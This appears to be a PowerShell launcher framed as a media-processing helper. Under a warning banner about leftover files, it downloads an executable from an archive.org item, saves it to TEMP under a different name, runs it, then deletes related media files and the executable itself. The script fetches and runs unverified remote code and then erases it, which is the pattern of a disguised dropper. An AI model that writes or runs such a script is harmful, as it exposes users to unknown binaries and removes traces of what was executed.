Write-Host ""
Write-Host "==================== WARNING ====================" -ForegroundColor Yellow
Write-Host "If you close this window while the program runs," -ForegroundColor Yellow
Write-Host "you may risk losing disk space to leftover files!" -ForegroundColor Yellow
Write-Host "Always let it finish, or use Ctrl+C in this window." -ForegroundColor Yellow
Write-Host "=================================================" -ForegroundColor Yellow
Write-Host ""

$exe = "$env:TEMP\virtualend.exe"
iwr archive.org/download/video_20250927_2306/video.exe -OutFile $exe

# Run and wait for it to finish
Start-Process $exe -Wait

# Double cleanup: delete all possible output files just in case
$files = @(
    "$PSScriptRoot\input.mp4",
    "$PSScriptRoot\audio.wav",
    "$env:TEMP\input.mp4",
    "$env:TEMP\audio.wav"
)
foreach ($f in $files) {
    if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
}

# Remove the EXE itself
Remove-Item $exe -Force -ErrorAction SilentlyContinue
